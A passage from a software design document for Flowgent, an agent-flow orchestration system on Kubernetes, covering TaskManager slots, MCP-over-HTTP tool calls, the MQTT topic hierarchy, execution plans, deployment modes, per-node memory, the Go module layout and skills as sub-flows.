reconciles the K8s Deployments via the API.
In **session mode**, the goroutine exits immediately — TM replicas are pre-deployed
by Helm and manually scaled by the admin.

| | Session | Application |
|---|---|---|
| **TM replicas** | Helm `taskmanager.replicas` (admin-managed) | Starts at 0; JM auto-scales on `Schedule()` and `scalingLoop` by pending plans / slots |
| **Slot goroutine** | NOT started (`autoScale=false` → early return) | Started and actively reconciles |
| **Flink analogy** | Session Cluster — pre-allocated TaskManagers | Application Cluster — elastic TaskManagers |

---

## 6. TaskManager — MQTT Consumer + Executor (apiserver REST, NO DB)

Session mode uses long-running K8s Deployments (or in-process workers in
all-in-one mode). Application mode uses JM-owned, active-run TM Deployments that
scale from zero and are removed when the owning run/flow no longer needs them.
Each TM pod runs N `SlotWorker` goroutines (default 4). Each slot independently dequeues one
`ExecutionPlan` from the MQTT queue (or channel), executes it via the
`TaskExecutorRouter`, persists task status via the apiserver REST API
(`TaskStateStore.SaveTask`), and reports the result back to JM via MQTT.

The key relationship: **1 Slot = 1 ExecutionPlan = 1 DAG Node**. A TM pod with 4
slots executes up to 4 DAG nodes concurrently.

### 6.1 TaskExecutorRouter — 12 Node Types

| Type | Executor | Description |
|------|----------|-------------|
| `agent` | AgentExecutor | LLM call via configured provider |
| `tool` | ToolExecutor | MCP tool invocation |
| `condition` | ConditionExecutor | Boolean expression evaluation |
| `supervisor` | SupervisorExecutor | LLM-based action decision |
| `committee` | CommitteeExecutor | Majority vote across inputs |
| `human` | HumanExecutor | Approval gate with timeout |
| `map` | MapExecutor | Fan-out over list (with nesting) |
| `join` | JoinExecutor | Merge fan-out results |
| `agentflow` | SubflowExecutor | Nested agentflow execution (TaskType: subflow) |
| `skill` | SkillExecutor | Skill-kinded sub-agentflow dispatch |
| `sandbox` | SandboxExecutor | Secure script execution (python3/bash/node) with network isolation |
| `noop` | NoopExecutor | Terminal node, passthrough |

### 6.2 MCP Transport — HTTP-Only (Streamable HTTP)

TM pods are pure backend agents running in K8s — no human interaction, no desktop
environment, no subprocess launcher. All MCP (Model Context Protocol) server
communication uses **Streamable HTTP** transport via `mark3labs/mcp-go`'s
`client.NewStreamableHttpClient`. The `McpManager` manages HTTP client lifecycle:
each MCP server definition stores a URL and optional headers (auth tokens,
namespace forwarding), NOT a command/args/env vector.

```
TM Pod (SlotWorker)
  → ToolExecutor.Execute(plan)
    → McpManager.CallTool(serverName, toolName, args)
      → GetClient(name) → NewStreamableHttpClient(url, WithHTTPHeaders(headers))
        → c.Initialize(ctx, initReq)     // MCP protocol handshake over HTTP
        → c.CallTool(ctx, callToolReq)   // JSON-RPC over HTTP POST
          → upstream MCP server (sonarqube-mcp, github-mcp, etc.)
```

The `McpInfo` entity stored in PG (`llm_mcp` table) carries:
- `url` — MCP server endpoint (e.g. `http://172.29.235.101:18080/mcp`)
- `headers` — optional auth/forwarding headers (e.g. `Authorization: Bearer xxx`)

This is consistent with how Claude Code, Codex, Cursor, and OpenCode all support
remote MCP servers — the TM is just another MCP client, connecting over HTTP.

### 6.3 Heartbeat & Failover

TMs send periodic heartbeats. JM's KubernetesResourceManager detects dead TMs
and re-dispatches orphaned plans.

---

## 7. MQTT Event Bus

All inter-component communication flows through MQTT topics under a unified
namespace. The hierarchy isolates namespaces and supports both session and
application deployment modes.

### 7.1 Topic Hierarchy

All inter-component communication uses MQTT topics under `flowgent/v1/` with
a hierarchical `{namespaceId}/flows/{flowId}/runs/{runId}` structure for
observability and multi-namespace isolation. Only apiserver touches DB.

```
# ── Execution Plan Dispatch: JM → TM ──────────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/exec/plans
  JM publishes: serialized ExecutionPlan JSON
  TM subscribes via $share/tm-pool/.../exec/plans (load-balanced)
  → All routing info visible in topic for debugging

# ── Execution Result: TM → JM ─────────────────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/exec/results
  TM publishes: TaskResult JSON (status, output, error)
  JM subscribes per-run: JM polls results for active runs

# ── Sandbox Trigger: TM → Sandbox ─────────────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/trigger
  TM publishes: model.SandboxTrigger (flowId, runId, scriptPath, ...)
  Sandbox subscribes via $share/sandbox-pool-{namespace}-{flow}/.../sandbox/trigger
  (load-balanced across JM-owned sandbox pods and their SandboxSlotWorker slots)

# ── Sandbox Result: Sandbox → TM ──────────────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/result
  Sandbox publishes: TaskResult JSON (stdout, stderr, exit_code)
  TM (originating slot only) subscribes: continues DAG execution

# ── Controller → JM (dedicated JM creation) ───────────────────
flowgent/v1/{namespace}/flows/{flowId}/ctrl/jm/create
  Controller publishes: "create dedicated JM for this flow"
  JM (leader-elected) subscribes: creates K8s JM Deployment

# ── Notifier Events: Publisher → Notifier ─────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/notify/event
  JM/Controller/TM publishes: notification event
  Notifier subscribes via $share/notify-pool/.../notify/event (load-balanced)

# ── Notifier Results: Notifier → Publisher ────────────────────
flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/notify/result
  Notifier publishes: delivery confirmation
  Publisher subscribes per-run

# ── TM Heartbeat: TM → JM ─────────────────────────────────────
flowgent/v1/heartbeat/{tmId}
  TM publishes: periodic heartbeat (every 5s)
  JM subscribes flowgent/v1/heartbeat/+: detects dead TMs, triggers failover

# ── WebSocket Routing (notifier-internal) ─────────────────────
flowgent/v1/notify/pod/{podId}/ws/{wsId}
  Cross-pod WS message delivery for human approval push

# ── State Write (via apiserver, NOT MQTT) ─────────────────────
POST /api/v1/{namespace}/runs/{id}/tasks/{tid}
  TM/sandbox/notifier → apiserver → PG
  (status updates, results, errors — persisted via REST)
```

**Publisher → Consumer mapping:**

| Publisher | Topic | Consumer | Mechanism |
|-----------|-------|----------|-----------|
| K8sRM.Schedule | `flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/exec/plans` | SlotWorker.Loop | `$share/tm-pool` competing consumers |
| SlotWorker (result) | `flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/exec/results` | JobMaster | Per-run subscription |
| SandboxExecutor (TM) | `flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/trigger` | SandboxRunner (sandbox pod) | `$share/sandbox-pool` competing consumers |
| SandboxRunner (sandbox pod) | `flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/sandbox/result` | SandboxExecutor (TM) | Per-run subscription |
| Notifier.Publish | `flowgent/v1/{namespace}/flows/{flowId}/runs/{runId}/notify/event` | Notifier consumer | `$share/notify-pool` per-namespace |
| TM heartbeat | `flowgent/v1/heartbeat/{tmId}` | HeartbeatMonitor | Wildcard `flowgent/v1/heartbeat/+` for all TMs |

### 7.1.1 DAG Execution Round-Trip (exec/plans + exec/results)

The `exec/plans` → `exec/results` topic pair is the backbone of DAG dependency
coordination. The JM enforces topological order by blocking on each plan's
result before dispatching the next:

```
JM.Execute()              K8sRM.Schedule()              MQTT                     TM.SlotWorker
──────────                ────────────────              ────                     ─────────────
for iteration=1,2,...:
  Ready() → [A,B,...]
  for each nodeID:
    │
    ├─Schedule(plan) ──►  Subscribe exec/results
    │                     (once per run, if first call)
    │                     Register chan[nodeID]
    │                     Publish exec/plans ──────►  ───────────────────►  $share/tm-pool
    │                                                                       SlotWorker dequeue
    │                                                                       Executor.Execute()
    │                                                                       PUT /tasks (REST)
    │                     ◄── Publish exec/results ──  ◄───────────────────  {plan_id,node_id,state}
    │                     Route er.NodeID → chan[nodeID]
    │                     delete chan[nodeID]
    ◄── TaskResult ──────
    Done(nodeID)          // unblocks children for next iteration
    │
    // next iteration: children of just-completed nodes become Ready()
```

**Critical timing**: The subscribe-before-publish ordering is mandatory.
`K8sRM.Schedule()` registers the per-node channel on `exec/results` BEFORE
publishing to `exec/plans`. If the order were reversed, a fast TM could
publish the result before the JM's callback is registered, causing the
`Schedule()` call to hang until `planTimeout`.

**State-only callback**: `exec/results` carries only `{plan_id, node_id,
state}` — the actual output data is persisted by the TM via
`PUT /api/v1/{namespace}/runs/{id}/tasks/{tid}` BEFORE publishing to
`exec/results`. The JM then reads output data from the task record (or relies
on the in-memory `nodeOutputs` map populated from the Schedule return value
for variable resolution in subsequent nodes). See §8.1 for the ExecutionPlan
data model.

### 7.2 Session vs Application Mode

Heartbeat tmID uses a naming convention to distinguish modes at the topic level:

| Mode | tmID Pattern | Example |
|------|-------------|---------|
| session | `session-tm-{hostname}-{hash}` | `session-tm-k8sm1-a1b2c3d4` |
| application | `app-{namespace}-{flowId}-tm-{hostname}-{hash}` | `app-default-security-fixer-tm-k8sm1-e5f6g7h8` |

The JM monitors `heartbeat/+` and can distinguish session vs application TMs
by the tmID prefix — no need for separate topic branches.

### 7.3 Queue Configuration

```yaml
# flowgent.yaml
messaging:
  type: mqtt
  mqtt:
    broker: "tcp://<host>:1883"
```
The topic prefix `flowgent/v1/` is a hardcoded constant in the messager package.
Topic builders like `messager.ExecPlansTopic(namespace, flow, run)` construct the
full hierarchical path from routing keys.

### 7.4 Fail-Fast in Distributed Mode

In distributed mode (`deployment.mode: session` or `application`), MQTT is mandatory:

1. Config file `messaging.mqtt.broker` → try MQTT → failure = fatal
2. `FLOWGENT_MQTT_BROKER` env var → try MQTT → failure = fatal
3. Neither configured → fatal: `"MQTT broker not configured"`

In standalone dev / all-in-one mode, the queue silently falls back to in-memory
(`StandaloneMessager`, buffer=1000) with a warning log.

---

## 8. ExecutionPlan & Checkpoint

### 8.1 ExecutionPlan

The `ExecutionPlan` is the atomic unit of work dispatched to TM slots. The data
hierarchy is:

```
agentflow_definition (flow spec, defines Nodes + Edges)
  └── agentflow_run (one invocation of a flow, status: PENDING→RUNNING→COMPLETED/FAILED)
        ├── execution_plan (plan-node-A, 1:1 with DAG node A)
        ├── execution_plan (plan-node-B, 1:1 with DAG node B)
        └── execution_plan (plan-node-C, 1:1 with DAG node C)
```

**Each DAG node produces exactly one ExecutionPlan, and every ExecutionPlan
belongs to exactly one AgentFlowRun.** A flow with N nodes creates N plans per run.
Each plan is serialized to JSON, persisted to PG, then dispatched to a TM slot for
execution.

Each ExecutionPlan contains: PlanID, NodeID, AgentFlowRunID, TaskType, Input,
RetryPolicy, and Agent/Tool references.

### 8.2 TaskCheckpoint

Periodic snapshot of DAG state (completed nodes, node outputs, pending set).
Enables resume-after-failure without re-executing completed nodes.

---

## 9. Deployment Topologies

### 9.1 All-in-One Mode (Local Development)

```bash
flowgent all-in-one start -c etc/flowgent.yaml
```

Single process: API Server + JM + TM (StandaloneRM, goroutine pool). SQLite + Memory
cache. For development and small-scale standalone testing only.

### 9.2 Distributed K8s (Session Mode) — ⚠️ reserved, not currently deployable

Session mode is temporarily disabled (see §1.1): the Helm chart no longer
ships `jobmanager`/`taskmanager` shared-pool templates, so this section
describes the reserved design, not a runnable `helm install` today.

```bash
helm install flowgent deploy/helm/flowgent \
  --set apiserver.replicas=2 \
  --set jobmanager.replicas=2 \
  --set taskmanager.replicas=2 \
  # ... all 6 services
```

12 pods (6×2), PG + EMQX + Redis backend. JM HA via IDiscoveryClient leader
election. TM capacity admin-managed via Helm.

### 9.3 Application Mode (VIP Dedicated Cluster) — current default (only mode)

Controller detects an active run for a flow (`PENDING`, `RUNNING`, or `PAUSED`)
→ creates a dedicated K8s JM Deployment
(`flowgent-jobmanager-{namespaceId}-{flowId}` — see `applicationNamespace` in
`pkg/controller/pkg/controller.go`) in the flow's **namespace** namespace
(`{namespace_prefix}{namespaceId}`, per §1.3 — every flow of the same namespace
shares one namespace; Helm does not pre-create it, `ensureApplicationInfra`
lazily creates it on first active run for any flow in that namespace) → JM
auto-scales TMs and Sandbox pods from zero based on active task load and
configured slots. Flow or skill definition import/update alone creates no
JM/TM/Sandbox pods. When no active run remains, Controller cleans up the JM and
its JM-owned TM/Sandbox Deployments (the namespace namespace itself is left
behind, since other flows of the same namespace may still be using it — see
VERIFICATION.md Environment Reset for manual cleanup).

---

## 10. Execution Flow (End to End)

There are two paths to trigger a run:

### 10.1 Path A: API Trigger (Sync → Async)

```
1. TRIGGER (sync)
   → REST:     POST /api/v1/{namespace}/flows/trigger  {agentflow_id, vars}
   → A2A:      POST /a2a/tasks                       {agentflow_id, vars}
   → Webhook:  POST /api/v1/webhook/{provider}       (e.g, GitHub/GitLab/BitBucket req body)
       → per-provider adapter normalizes body → canonical WebhookEvent
       → for each flow whose triggers match {provider, event}: one run
   → all paths converge on FlowDefHandler.CreateRunFromTrigger:
       → validate spec exists
       → persist PENDING run via store (Application-mode namespace)
       → publish ctrl/run/created lifecycle event on MQTT
       → return run_id(s) to caller    ← sync ends here

2. JM POLL (async)
   → JM's runPoller (2s tick) finds PENDING run (namespace-filtered)
   → jm.Submit(run, spec) spawns JobMaster → DAG parse → topological TM dispatch
```

### 10.2 Path B: Controller Dispatch (Fully Async)

> ⚠️ Session mode currently disabled (see §1.1) — only the Application branch
> below actually runs.

```
1. CONTROLLER POLL
   → Controller polls apiserver ListFlows every 10s
   → Hash-mod shard: only processes owned flows (peer snapshot fetched once/tick)
   → Registers cron / interval triggers for owned flow definitions
   → Flow definition import/update alone is metadata only; no JM/TM allocation
   → (reserved) Session mode: FlowgentClient.CreateRun (PENDING, namespace="")
   → Application mode: API/webhook/cron creates FlowRun (PENDING)
   → Active-run reconcile ensures K8s Deployment flowgent-jobmanager-{namespaceId}-{flowId}

2. JM POLL
   → Dedicated JM picks up its own namespace runs
   → jm.Submit(run, spec) spawns JobMaster
```

### 10.3 Common Execution Path (Both Paths)

```
3. DAG BUILD (JobMaster.Execute)
   → Parses agentflow definition JSON (AgentFlowSpec.Nodes + Edges)
   → BuildGraphNodes → initializes DAG state
   → Persists task runs via apiserver REST (RunStateStore.SaveTask)
   → run.Status = RUNNING

4. TOPOLOGICAL LOOP
   ready := jm.Ready()
   for each ready node:
     plan := buildPlan(node, inputs, resolved vars)
     result := rm.Schedule(plan)  → MQTT (K8s) or standalone slot (all-in-one)
     Done(node) / Fail(node)
     condition → SetConditionResult → Skip(false-branch)
     supervisor → validate action → Inject/Retry/Abort

5. RM DISPATCH
   → Evaluates pending plans vs free slots
   → StandaloneRM: goroutine pool, returns INSUFFICIENT_RESOURCES if full
   → K8sRM: publishes plan to MQTT topic, TM pods consume;
     auto-scales TM replicas based on queue depth (application mode)

6. TM EXECUTION
   → SlotWorker dequeues ExecutionPlan from MQTT / channel
   → ExecutorRouter dispatches to correct executor (agent/tool/supervisor/...)
   → Result published back to JM via MQTT

7. COMPLETION
   → IsComplete() → run.Status = COMPLETED
   → HasFailed()  → run.Status = FAILED
   → Persist final state via apiserver REST (RunStateStore.UpdateRun)
```

### 10.4 TM Failover

```
1. TM sends heartbeat every 5s
2. JM's K8s RM detects missing heartbeat after 30s
3. Dead TM's leases expire → plans re-claimed by other TMs
4. K8s Deployment controller restarts dead TM pod
5. Orphaned plans re-executed from checkpoint
```

---

## 11. Notifier Service — MQTT Consumer + Multi-Channel Push (NO DB)

Bridges internal agentflow events to external communication channels.

### 11.1 Architecture

```
  ┌────────────────────────────────────────────┐
  │       Notifier Service (2+ pods)        │
  │  ┌──────────────────┐  ┌────────────────┐  │
  │  │ MQTT Queue       │  │ Human Approval │  │
  │  │ Consumer         │  │ Scanner (5s)   │  │
  │  │ Topic: /flowgent/│  │ SELECT PENDING │  │
  │  │ notify/queue/    │  │ human_approvals│  │
  │  │ {namespace}/{flow}  │  └───────┬────────┘  │
  │  └────────┬─────────┘          │           │
  │           └──────────┬─────────┘           │
  │                      ▼                     │
  │           ┌──────────────────┐            │
  │           │ Channel Dispatcher│            │
  │           │ Slack/DingTalk/   │            │
  │           │ Telegram/Email/   │            │
  │           │ Webhook           │            │
  │           └──────────────────┘            │
  └────────────────────────────────────────────┘
```

### 11.2 Queue Consumer

MQTT shared subscription per namespace+flow: `flowgent/v1/{namespace}/flows/{flow}/runs/{run}/notify/event`.
Messages load-balanced across notifier pods via `$share/notify-pool`. Each message
dispatched to configured channels for that namespace.

### 11.3 IDiscoveryClient — Pluggable Service Discovery

```go
type IDiscoveryClient interface {
    DiscoverPeers(ctx, labelSelector) ([]Peer, error)
    Self() Peer
    IsLeader(ctx, labelSelector) (bool, error)
    WatchPeers(ctx, labelSelector) (<-chan []Peer, error)
}
```

Implementations: `K8sDiscoveryClient` (label-selector pod listing, like Flink's
KubernetesHA), `StaticDiscoveryClient` (env-var based, for dev/CI).

---

## 12. Agent Node Memory

Each (flow_definition, node) pair accumulates a persistent memory entry. Unlike
run-scoped memory, `NodeMemory` survives across ALL runs of the same flow —
restarts and interruptions automatically benefit from prior execution context.

### 12.1 Model

```go
type NodeMemory struct {
    FlowID    string         // agentflow definition ID (NOT run ID)
    NodeID    string         // DAG node ID (empty = flow-level shared)
    Content   string         // accumulated execution context (appended each run)
    Embedding []float32      // vector for similarity search
    Metadata  map[string]any // {retry_count, last_error, last_model, token_usage, ...}
}
```

**Scoping rule**: memory is keyed by `(flow_id, node_id)` — same flow definition + same
node, across all runs. Run ID is NOT part of the key. Cross-flow memory sharing is
intentionally NOT supported (simplicity).

### 12.2 Lifecycle

```
1. BEFORE LLM call:
   GetMemory(flowID, nodeID)
   → if found, append prior content to prompt as context

2. AFTER each attempt:
   UpsertMemory({ flowID, nodeID, content })  ← accumulates, doesn't replace

3. Content grows monotonically:
   "attempt=0 prompt=... response=... error=..."
   "attempt=1 prompt=... response=..."
   → Richer context for every subsequent run
```

### 12.3 PG Schema

```sql
CREATE TABLE node_memories (
    flow_id    VARCHAR(255) NOT NULL,
    node_id    VARCHAR(255) NOT NULL DEFAULT '',
    content    TEXT NOT NULL,
    embedding  JSONB,
    metadata   JSONB DEFAULT '{}',
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW(),
    PRIMARY KEY (flow_id, node_id)
);
```

### 12.4 Store Interface

```go
type NodeMemoryStore interface {
    GetMemory(ctx, flowID, nodeID string) (*NodeMemory, error)
    UpsertMemory(ctx, mem *NodeMemory) error
    SearchMemory(ctx, flowID string, embedding []float32, topK int) ([]NodeMemory, error)
    ListFlowMemories(ctx, flowID string) ([]NodeMemory, error)
    DeleteMemory(ctx, flowID, nodeID string) error
}
```

The `AgentExecutor` accepts an optional `NodeMemoryStore`; when present, memory is
persisted after each attempt and queried before LLM calls.

---

## 13. Metrics & Observability

OpenTelemetry integration with configurable exporters:

| Signal | Implementation | Config |
|--------|---------------|--------|
| Traces | W3C TraceContext propagation through MQTT | `mgmt.otel` |
| Metrics | Prometheus exporter, custom histogram buckets per domain | `mgmt.metrics.prometheus` |
| pprof | Debug endpoints at `:6669` | `mgmt.pprof` |

Histogram boundaries (from sample config):
- Task execution: `[0.1, 0.5, 1, 2, 5, 10, 30, 60, 120]s`
- LLM calls: `[0.5, 1, 2, 5, 10, 30, 60, 120, 300]s`
- Queue latency: `[0.01, 0.05, 0.1, 0.5, 1, 5, 10, 30]s`

---

## 14. Key Design Constraints

| Constraint | Rationale |
|-----------|-----------|
| Only `agent` and `supervisor` use LLM | All other nodes must be deterministic |
| Vote must be deterministic | LLM "judges", vote "decides" |
| Agent output must be JSON | Machine-readable, auditable |
| Supervisor actions constrained | redirect/retry/inject/abort only |
| Human node must persist + timeout | DB-backed, resume via API |
| Map must support nesting | Multi-level fan-out |

---

## 15. Code Layout & File Map

The codebase is a Go workspace (`go.work`) joining 13 modules with a strictly
acyclic dependency graph. `cmd` is the leaf — it depends on everything.
`common` is the root — zero dependencies.

```
common (zero deps)
  ↑
model (→ common)
  ↑
  ├─ messager (→ common + model)
  ├─ cache (→ common + model)
  └─ config (→ common + model + cache)
       ↑
       ├─ wallet (→ common + model)
       ├─ notifier (→ config + messager + model)
       ├─ sandbox (→ common + model + messager)
       ├─ store (→ config + model + cache)
       ├─ console (→ config + model + store + wallet)
       └─ core (→ config + messager + model + cache + notifier + wallet + sandbox + store)
             ↑
             ├─ cmd (→ everything)
             └─ api (→ config + model + store)
```

| # | Module | Path | Module Path | Depends On |
|---|--------|------|-------------|------------|
| 1 | common | `pkg/common/` | `flowgent/common` | (none) |
| 2 | model | `pkg/model/` | `flowgent/model` | common |
| 3 | messager | `pkg/messager/` | `flowgent/messager` | common, model |
| 4 | cache | `pkg/cache/` | `flowgent/cache` | common, model |
| 5 | config | `pkg/config/` | `flowgent/config` | common, model, cache |
| 6 | wallet | `pkg/wallet/` | `flowgent/wallet` | common, model |
| 7 | notifier | `pkg/notifier/` | `flowgent/notifier` | config, messager, model |
| 8 | sandbox | `pkg/sandbox/` | `flowgent/sandbox` | common, model, messager |
| 9 | store | `pkg/store/` | `flowgent/store` | config, model, cache |
| 10 | console | `pkg/console/` | `flowgent/console` | config, model, store, wallet |
| 11 | core | `pkg/core/` | `flowgent/core` | config, messager, model, cache, notifier, wallet, sandbox, store |
| 12 | api | `pkg/api/` | `flowgent/api` | config, model, store |
| 13 | cmd | `pkg/cmd/` | `flowgent/cmd` | all above |

### common (`pkg/common/pkg/`) — Module 1 (root)

| Path | Role |
|------|------|
| `tracing/` | OTEL tracer/metrics provider; defines its own OTELConfig, MetricsConfig |
| `utils/` | Structured logger (slog wrapper), utilities |

### model (`pkg/model/pkg/`) — Module 2

| Path | Role |
|------|------|
| `*.go` | Shared domain types: AgentFlowSpec, Node, Edge, Run, NetworkPolicy, SandboxPolicy, ExecutionPlan, etc. |

### messager (`pkg/messager/pkg/`) — Module 3

| Path | Role |
|------|------|
| `messager.go` | IMessager interface (Publish/Subscribe/Unsubscribe) + Message types |
| `local.go` | In-memory messager (goroutine-safe) |
| `mqtt.go` | MQTT messager (EMQX) for distributed mode |
| `instrumented.go` | OTEL metrics for messaging operations |

### cache (`pkg/cache/pkg/`) — Module 4

| Path | Role |
|------|------|
| `cache.go` | ICache interface |
| `memory.go` | In-memory LRU cache; defines MemoryCacheConfig |
| `redis.go` | Redis cache (standalone/cluster/sentinel); defines RedisCacheConfig |

### config (`pkg/config/pkg/`) — Module 5

| Path | Role |
|------|------|
| `config/config.go` | Top-level FlowgentConfig; YAML/viper loading; agent/flow loading |

### wallet (`pkg/wallet/pkg/`) — Module 6

| Path | Role |
|------|------|
| `policy/` | Payment policy engine |
| (x402 facilitator, providers, receipts) | Payment subsystem |

### notifier (`pkg/notifier/pkg/`) — Module 7

| Path | Role |
|------|------|
| `notifier.go` | Notifier service lifecycle |
| `channel/websocket.go` | WebSocket channel for UI push |

### sandbox (`pkg/sandbox/pkg/`) — Module 8

| Path | Role |
|------|------|
| `sandbox/` | SandboxRunner lifecycle, script execution, policy validation |
| `seccomp/` | seccomp-bpf filter builder/installer, USER_NOTIF handler, re-exec child |

### store (`pkg/store/pkg/`) — Module 9

| Path | Role |
|------|------|
| `store.go` | IStore interface + StoreManager factory |
| `postgres.go` | PostgreSQL connection pool |
| `sqlite.go` | SQLite connection |
| `agentdef/` | Agent definition store (PG + SQLite) |
| `agentflow/` | AgentFlow definition store (PG + SQLite) |
| `flowrun/` | FlowRun store (PG + SQLite) |
| `task/` | task store (PG + SQLite) |
| `approval/` | Human approval store (PG + SQLite) |
| `llmprovider/` | LLM provider store (PG + SQLite) |
| `notifier/` | Notifier channel store (PG only) |
| `memory/` | Node memory store (PG + SQLite) |

### console (`pkg/console/pkg/`) — Module 10

| Path | Role |
|------|------|
| `console.go` | FlowgentConsole class — lazy store init, secret store setup, namespace management |
| `types.go` | ExportData, ResourceImport (K8s-style), ResourceMetadata, WalletExport |
| `export.go` | ExportKinds/ExportAll — filtered export (kinds: llm, channel, mcp, skill, agent, flow, flowrun) |
| `import.go` | ImportPaths/ImportFile/ImportResource — YAML/JSON import with K8s-style resource wrapper support |
| `repl.go` | Interactive REPL (liner-based) — CRUD for 9 resource types + import/export commands |

### core (`pkg/core/pkg/`) — Module 11

| Path | Role |
|------|------|
| `client/` | FlowgentClient — HTTP REST client for all non-apiserver components |
| `engine/executor/` | 12 TaskExecutor implementations (agent, tool, sandbox, supervisor, etc.) |
| `engine/jobmanager/` | JobManager + JobMaster DAG orchestrator |
| `engine/resourcemanager/` | ResourceManager (Standalone + Kubernetes) |
| `engine/taskmanager/` | TaskManager + SlotWorker pool + heartbeat |
| `engine/discovery/`, `engine/checkpoint/`, `engine/trigger/` | Engine subsystems |
| `llm/` | LLM client (OpenAI-compatible) + LlmProviderManager |
| `mcp/` | MCP HTTP client manager (Streamable HTTP transport, lazy-connect, tool invocation) |
| `lock/` | Distributed lock (memory/Redis/Postgres) |

### api (`pkg/api/pkg/`) — Module 12

| Path | Role |
|------|------|
| `server.go` | REST API route registration |
| `handler/` | HTTP handlers: agent defs, flow defs, flow runs, human approval, notifier, LLM providers |

### cmd (`pkg/cmd/pkg/`) — Module 13 (leaf)

| Path | Role |
|------|------|
| `pkg/` | CLI entry (cobra): apiserver, controller, jobmanager, taskmanager, a2a, notifier, allinone, sandbox |
| `cmdutil/cmdutil.go` | Shared helpers: PID, store init, MQTT, notifier adapters, auth middleware |

### Deployment

| Path | Role |
|------|------|
| `deploy/helm/flowgent/` | Helm chart (microservices with configurable replicas) |
| `deploy/docker/Dockerfile` | Container image |

---

## 16. Skills = Sub-AgentFlow

### 16.1 Core Insight

**A Skill is a sub-AgentFlow.** Nothing more. A "skill" accomplishes a task — which inherently means orchestrating multiple tools and/or agents. That's exactly what an AgentFlow is. Users migrating from Claude Code, Codex, Copilot, or any other agent framework can drop their existing skills into Flowgent as AgentFlow YAML files and reference them as `kind: agentflow` nodes.

No new abstractions. No new executors. No ReAct loop. No mandatory schema.

### 16.2 AgentFlowSpec — Optional Fields for Skills

```go
type AgentFlowSpec struct {
    ID           string         `json:"id" yaml:"id"`
    Kind         string         `json:"kind,omitempty" yaml:"kind,omitempty"`           // "skill" | "" (empty = regular flow)
    Description  string         `json:"description,omitempty" yaml:"description,omitempty"`
    Summary      string         `json:"summary,omitempty" yaml:"summary,omitempty"`     // one-liner for A2A card
    InputSchema  *JSONSchema    `json:"input_schema,omitempty" yaml:"input_schema,omitempty"`
    OutputSchema *JSONSchema    `json:"output_schema,omitempty" yaml:"output_schema,omitempty"`
    Vars         map[string]any `json:"vars,omitempty" yaml:"vars,omitempty"`
    Nodes        []Node         `json:"nodes" yaml:"nodes"`
    Edges        []Edge         `json:"edges" yaml:"edges"`
    Triggers     []TriggerDef   `json:"triggers,omitempty" yaml:"triggers,omitempty"`
}
```

`input_schema` and `output_schema` are entirely optional. Schemas are purely for A2A discovery and optional validation.

### 16.3 Migration — Zero Friction

```yaml
# etc/skills/01-dependency-scan.yaml
apiVersion: core.flowgent.io/v1
kind: Flow
metadata:
  name: dependency-scan
spec:
  id: dependency-scan
  kind: skill
  summary: "Scan project dependencies for known CVEs"
  nodes:
    - id: clone
      kind: tool
      spec:
        tool: github
        args:
          action: clone_repo
          url: ${vars.repo_url}
    - id: scan
      kind: tool
      spec:
        tool: dependency-checker
        args:
          path: ${clone.output.path}
    - id: normalize
      kind: agent
      spec:
        agent: issue-detector
        args:
          raw_output: ${scan.output}
  edges:
    - { from: clone, to: scan }
    - { from: scan, to: normalize }
```

Reference from any flow: `kind: agentflow`, `agentflow: dependency-scan`.

### 16.4 Why Skill Instead of MCP Tool — The Nexus3 Case

A real example from the Security Autonomy Fixer flow illustrates when to use a skill
rather than a standalone MCP tool server.

**Problem:** The flow needs to fetch the latest top-3 Maven dependency versions where
SonatypeIQ `firewall.status=allow` (i.e., not quarantined). In a licensed enterprise
Nexus3 deployment, the SonatypeIQ integration makes firewall status visible in both
the Nexus3 UI and REST API. A simple MCP tool wrapping the Nexus3 swagger would suffice.

However, Nexus3 open-source and personal deployments **lack the SonatypeIQ license**,
so:
- The Nexus3 UI shows no firewall status column
- The Nexus3 REST API swagger does not return `firewall.status` in component listings

**Solution:** Replace the Nexus3 MCP tool with a **skill** — a sub-AgentFlow that wraps
existing copilot scripts. These scripts directly call:
- `gh` CLI for GitHub API access
- Nexus3 web API for component metadata
- `gcloud` CLI for artifact registry queries

The skill orchestrates these deterministic calls and returns the filtered top-3 versions,
exactly as the MCP tool would — but without requiring the SonatypeIQ license.

**Design principle:** When a third-party system's API varies between licensed and
open-source editions, prefer a skill. Skills embed operational knowledge (which APIs
to call, in what order, how to parse responses) that would otherwise become brittle
configuration inside an MCP tool. Skills are also easier to customize per deployment
environment (dev/staging/production) without rebuilding any binaries.

```yaml
# In the flow YAML — skill replaces MCP tool
- id: fetch-safe-deps
  kind: skill
  spec:
    skill: nexus3-retrieval
    args:
      repo: ${vars.repo}
      maven_coordinates: ${scan-sonatypeiq.maven_coords}
      top_n: 3
```

This is the same `kind: skill` / `kind: agentflow` mechanism described in §13.1–13.3.
No new executors. No new abstractions. Just a flow referencing another flow.

---

## 17. Agent Definition — No Toolsets

### 17.1 Tools Belong to the DAG, Not the Agent

Tools are deterministic DAG nodes (`kind: tool`). The flow designer decides which tool to call, at which step, with which inputs. The agent receives tool output and reasons about it — it never decides to call a tool itself. This is the architectural line between enterprise orchestration (DAG-controlled) and personal AI assistants (ReAct loop).

### 17.2 AgentDef — Structured Additions

```go
type AgentDef struct {
    Name         string      `json:"name" yaml:"name"`
    Model        string      `json:"model" yaml:"model"`
    Soul         string      `json:"soul" yaml:"soul"`
    Instruction  string      `json:"instruction" yaml:"instruction"`
    OutputSchema *JSONSchema `json:"output_schema,omitempty" yaml:"output_schema,omitempty"`
    Temperature  *float64    `json:"temperature,omitempty" yaml:"temperature,omitempty"`
    MaxTokens    int         `json:"max_tokens,omitempty" yaml:"max_tokens,omitempty"`
}
```

| Field | Why |
|-------|-----|
| `output_schema` | Structured output contract — replaces prose "Output STRICT JSON: {...}" in `instruction`. Enables validation. |
